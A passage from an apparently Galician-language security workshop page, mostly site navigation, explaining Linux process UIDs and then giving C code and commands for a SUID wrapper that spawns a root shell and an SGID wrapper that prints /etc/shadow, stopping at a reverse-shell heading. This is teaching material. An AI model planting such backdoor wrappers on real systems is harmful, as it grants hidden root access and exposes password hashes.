+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Low
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Medium
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/practicas-taller-windows-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas Vulnyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Vuln Lab AD-DC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab AD-DC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/1-GUIA_MESTRA_VULN_HE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía mestra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1_3" id="__nav_3_3_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/8-ATAQUE_ESPECIFICO_SILVER_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Silver Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/9-ATAQUE_ESPECIFICO_GOLDEN_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Golden Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/6-ANALISE_USUARIOS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Análise usuarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-identificadores-de-proceso-e-identidade" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Identificadores de Proceso e Identidade
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Identificadores de Proceso e Identidade">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exercicios-de-reconecemento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exercicios de Recoñecemento
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-a-caixa-de-ferramentas-syscalls-e-administracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. A Caixa de Ferramentas: Syscalls e Administración
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. A Caixa de Ferramentas: Syscalls e Administración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a-funcions-de-c-e-syscalls-unistdh" class="md-nav__link">
+    <span class="md-ellipsis">
+      A. Funcións de C e Syscalls (&lt;unistd.h&gt;)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b-comandos-de-administracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      B. Comandos de Administración
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-o-dilema-system-vs-interpretes-vs-exec" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. O Dilema: system() vs Intérpretes vs exec()
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. O Dilema: system() vs Intérpretes vs exec()">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#por-que-system-adoita-fallar" class="md-nav__link">
+    <span class="md-ellipsis">
+      Por que system() adoita fallar?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-opcion-p-de-bash-privileged-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      A opción -p de Bash (Privileged Mode)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-casos-practicos-de-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Casos Prácticos de Persistencia
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Casos Prácticos de Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caso-1-wrapper-suid-para-root-shell-c" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 1: Wrapper SUID para Root Shell (C)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#caso-2-wrapper-sgid-para-acceso-ao-grupo-shadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 2: Wrapper SGID para acceso ao Grupo shadow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#caso-3-reverse-shell-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 3: Reverse Shell Root
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#caso-4-interpretes-pythonperlruby" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 4: Intérpretes (Python/Perl/Ruby)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-linux-capabilities-alternativa-moderna-aos-suid" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Linux Capabilities: Alternativa Moderna aos SUID
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Linux Capabilities: Alternativa Moderna aos SUID">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#capabilities-comuns-para-escalada-e-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capabilities Comúns para Escalada e Persistencia:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comandos-de-xestion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comandos de Xestión:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-practicos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos Prácticos:
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplos Prácticos:">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a-cap_setuid-cambiar-uid" class="md-nav__link">
+    <span class="md-ellipsis">
+      A. cap_setuid (Cambiar UID)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b-cap_setgid-cambiar-gid" class="md-nav__link">
+    <span class="md-ellipsis">
+      B. cap_setgid (Cambiar GID)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c-cap_dac_override-ignorar-permisos" class="md-nav__link">
+    <span class="md-ellipsis">
+      C. cap_dac_override (Ignorar Permisos)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#d-cap_sys_admin-o-pequeno-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      D. cap_sys_admin (O "Pequeno Root")
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-resumo-de-seguridade" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Resumo de Seguridade
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="uids-syscalls-e-wrappers-de-persistencia">UIDs, Syscalls e Wrappers de Persistencia</h1>
+<h2 id="1-identificadores-de-proceso-e-identidade">1. Identificadores de Proceso e Identidade</h2>
+<p>Linux non usa o teu nome de usuario para comprobar permisos, senón unha serie de identificadores numéricos (IDs) gardados na estrutura de credenciais do proceso no kernel.  </p>
+<table>
+<thead>
+<tr>
+<th>Tipo</th>
+<th>Descrición</th>
+<th>Uso</th>
+<th>Onde se garda?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Real UID/GID</strong></td>
+<td>O usuario/grupo que <strong>iniciou</strong> o proceso</td>
+<td>Identifica quen é realmente o propietario do proceso.</td>
+<td>Estrutura <code>task_struct</code> do kernel (campo <code>uid</code>/<code>gid</code>)</td>
+</tr>
+<tr>
+<td><strong>Effective UID/GID</strong></td>
+<td>O usuario/grupo usado para <strong>comprobacións de permisos xerais</strong></td>
+<td>Determina a maioría de comprobacións de acceso (sinais, capacidades).</td>
+<td>Estrutura <code>task_struct</code> do kernel (campo <code>euid</code>/<code>egid</code>)</td>
+</tr>
+<tr>
+<td><strong>Saved UID/GID</strong></td>
+<td>Copia de seguridade do Effective UID/GID orixinal</td>
+<td>Permite alternar entre privilexios sen perder o UID/GID elevado.</td>
+<td>Estrutura <code>task_struct</code> do kernel (campo <code>suid</code>/<code>sgid</code>)</td>
+</tr>
+<tr>
+<td><strong>Filesystem UID/GID</strong></td>
+<td>O usuario/grupo usado para <strong>comprobacións de disco</strong></td>
+<td>Determina os permisos ao acceder ao sistema de ficheiros (ler/escribir).</td>
+<td>Estrutura <code>task_struct</code> do kernel (campo <code>fsuid</code>/<code>fsgid</code>)</td>
+</tr>
+</tbody>
+</table>
+<details class="abstract">
+<summary>Concepto de FSUID e FSGID</summary>
+<p>O <strong>FSUID (Filesystem UID)</strong> e o <strong>FSGID (Filesystem GID)</strong> son identificadores específicos de Linux. Na maioría dos casos, o FUID coincide co EUID.  </p>
+<ul>
+<li><strong>Orixe:</strong> Foron creados para permitir que servidores de ficheiros (como NFS) poidan actuar en nome dun usuario para acceder a ficheiros sen permitir que ese servidor lle envíe sinais (como <code>kill</code>) ao usuario que está a ser suplantado.  </li>
+<li><strong>Uso:</strong> O kernel utiliza o FUID/FGID para comprobar permisos de lectura, escritura e execución exclusivamente no sistema de ficheiros.  </li>
+</ul>
+</details>
+<h3 id="exercicios-de-reconecemento">Exercicios de Recoñecemento</h3>
+<p><strong>Exercicio 1: Observar os IDs da túa Shell</strong><br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cat<span class="w"> </span>/proc/self/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;Uid|Gid&quot;</span>
+</span></code></pre></div>
+<strong>Saída:</strong><br />
+<code>Uid: 1000      1000     1000     1000</code><br />
+<code>Gid: 1000      1000     1000     1000</code> <br />
+      ^         ^        ^        ^
+      |         |        |        |
+    Real     Effective  Saved  Filesystem</p>
+<p><strong>Exercicio 2: O bit SUID no mundo real (<code>passwd</code> e <code>/etc/shadow</code>)</strong><br />
+1.  <strong>Comproba o ficheiro:</strong> <code>ls -l /etc/shadow</code> (Vulnerable se o grupo é <code>shadow</code>).<br />
+2.  <strong>Comproba o binario:</strong> <code>ls -l /usr/bin/passwd</code> (Verás o bit <code>s</code>).<br />
+3.  <strong>Ver o proceso vivo:</strong><br />
+    - Abre <code>passwd</code> nun terminal.<br />
+    - Noutro busca o PID e mira os UIDs/GIDs: 
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="o">[</span>p<span class="o">]</span>asswd<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="k">$(</span>pgrep<span class="w"> </span>passwd<span class="k">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="si">${</span><span class="nv">PID</span><span class="si">}</span><span class="w">   </span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>$<span class="w"> </span>cat<span class="w"> </span>/proc/<span class="si">${</span><span class="nv">PID</span><span class="si">}</span>/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;Uid|Gid&#39;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Uid:<span class="w">    </span><span class="m">1000</span><span class="w">    </span><span class="m">0</span><span class="w">       </span><span class="m">0</span><span class="w">       </span><span class="m">0</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Gid:<span class="w">    </span><span class="m">1000</span><span class="w">    </span><span class="m">1000</span><span class="w">    </span><span class="m">1000</span><span class="w">    </span><span class="m">1000</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span>^<span class="w">       </span>^<span class="w">       </span>^<span class="w">       </span>^
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span><span class="p">|</span><span class="w">       </span><span class="p">|</span><span class="w">       </span><span class="p">|</span><span class="w">       </span><span class="p">|</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">      </span>Real<span class="w">   </span>Effective<span class="w"> </span>Saved<span class="w">  </span>Filesystem
+</span></code></pre></div></p>
+<hr />
+<h2 id="2-a-caixa-de-ferramentas-syscalls-e-administracion">2. A Caixa de Ferramentas: Syscalls e Administración</h2>
+<h3 id="a-funcions-de-c-e-syscalls-unistdh">A. Funcións de C e Syscalls (<code>&lt;unistd.h&gt;</code>)</h3>
+<ul>
+<li><strong><code>setuid(0)</code></strong>: Pon RUID, EUID e FUID a 0.  </li>
+<li><strong><code>setreuid(0, 0)</code> / <code>setregid(gid, gid)</code></strong>: Forza a igualdade entre IDs reais e efectivos.  </li>
+<li><strong><code>execl()</code></strong>: Substitúe o proceso sen lanzar unha shell intermedia (máis seguro e evita bloqueos).  </li>
+</ul>
+<h3 id="b-comandos-de-administracion">B. Comandos de Administración</h3>
+<ul>
+<li><strong><code>gcc -o binario fonte.c</code></strong>: Compilar.  </li>
+<li><strong><code>sudo chown usuario:grupo binario</code></strong>: Cambiar propietario/grupo.  </li>
+<li><strong><code>sudo chmod 4755 binario</code></strong>: Activar SUID (4).  </li>
+<li><strong><code>sudo chmod 2755 binario</code></strong>: Activar SGID (2).  </li>
+</ul>
+<hr />
+<h2 id="3-o-dilema-system-vs-interpretes-vs-exec">3. O Dilema: <code>system()</code> vs Intérpretes vs <code>exec()</code></h2>
+<h3 id="por-que-system-adoita-fallar">Por que <code>system()</code> adoita fallar?</h3>
+<p><code>/bin/sh</code> (Bash/Dash) resetea os privilexios se <code>RUID != EUID</code>.<br />
+- <strong>Solución:</strong> Usar <code>setuid(0)</code> antes ou usar o flag <code>-p</code> (<code>bash -p</code>).  </p>
+<h3 id="a-opcion-p-de-bash-privileged-mode">A opción <code>-p</code> de Bash (Privileged Mode)</h3>
+<p>Executar <code>/bin/bash -p</code> impide que Bash renuncie ao UID efectivo.  </p>
+<hr />
+<h2 id="4-casos-practicos-de-persistencia">4. Casos Prácticos de Persistencia</h2>
+<div class="admonition tip">
+<p class="admonition-title">Entendendo os Includes en C</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Include</th>
+<th style="text-align: left;">Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>#include &lt;stdio.h&gt;</code></td>
+<td style="text-align: left;"><code>printf()</code>, <code>perror()</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>#include &lt;stdlib.h&gt;</code></td>
+<td style="text-align: left;"><code>system()</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>#include &lt;unistd.h&gt;</code></td>
+<td style="text-align: left;"><code>setuid()</code>, <code>getuid()</code>, <code>execl()</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>#define _GNU_SOURCE</code></td>
+<td style="text-align: left;">Habilita <code>setregid()</code>. Debe ser a liña 1.</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="caso-1-wrapper-suid-para-root-shell-c">Caso 1: Wrapper SUID para Root Shell (C)</h3>
+<p><div class="language-c highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-p&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">}</span>
+</span></code></pre></div>
+<strong>Comandos:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gcc<span class="w"> </span>-o<span class="w"> </span>root_shell<span class="w"> </span>root_shell.c
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo<span class="w"> </span>chown<span class="w"> </span>root:root<span class="w"> </span>root_shell
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>root_shell
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>./root_shell
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># Resultado: id -&gt; uid=0(root) gid=0(root)</span>
+</span></code></pre></div></p>
+<h3 id="caso-2-wrapper-sgid-para-acceso-ao-grupo-shadow">Caso 2: Wrapper SGID para acceso ao Grupo <code>shadow</code></h3>
+<p>Para que funcione, usamos <code>execl</code> e o binario debe pertencer ao grupo <code>shadow</code>.</p>
+<p><div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">#define _GNU_SOURCE</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="kt">gid_t</span><span class="w"> </span><span class="n">gid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getegid</span><span class="p">();</span><span class="w"> </span><span class="c1">// Obtén o GID do grupo &#39;shadow&#39;</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">    </span><span class="n">setregid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">);</span><span class="w">    </span><span class="c1">// Iguala Real e Efectivo</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">    </span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Lendo shadow con GID: %d...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">getgid</span><span class="p">());</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">    </span><span class="c1">// Usamos execl para evitar que /bin/sh bloquee o acceso</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">    </span><span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">    </span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Erro en execl&quot;</span><span class="p">);</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="p">}</span>
+</span></code></pre></div>
+<strong>Comandos:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gcc<span class="w"> </span>-o<span class="w"> </span>read_shadow<span class="w"> </span>read_shadow.c
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>sudo<span class="w"> </span>chown<span class="w"> </span>root:shadow<span class="w"> </span>read_shadow<span class="w">   </span><span class="c1"># IMPORTANTÍSIMO: grupo shadow</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">2755</span><span class="w"> </span>read_shadow<span class="w">          </span><span class="c1"># Activa SGID</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>./read_shadow
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Resultado: mostra o contido de /etc/shadow</span>
+</span></code></pre></div></p>
+<h3 id="caso-3-reverse-shell-root">Caso 3: Reverse Shell Root</h3>
